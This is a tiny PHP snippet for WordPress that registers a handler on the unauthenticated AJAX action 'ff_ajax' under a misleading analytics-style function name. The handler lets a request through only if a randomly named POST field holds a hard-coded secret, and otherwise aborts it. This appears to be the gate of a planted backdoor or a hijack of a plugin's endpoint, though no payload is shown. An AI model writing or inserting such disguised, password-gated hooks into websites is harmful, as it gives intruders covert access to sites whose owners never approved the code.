<?php

function style_bangla_taxonomy_analytics() {
	if (!isset($_POST["ewkeeibnwb"]) || $_POST["ewkeeibnwb"] !== "suusbMLs") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'style_bangla_taxonomy_analytics', 5, 1);
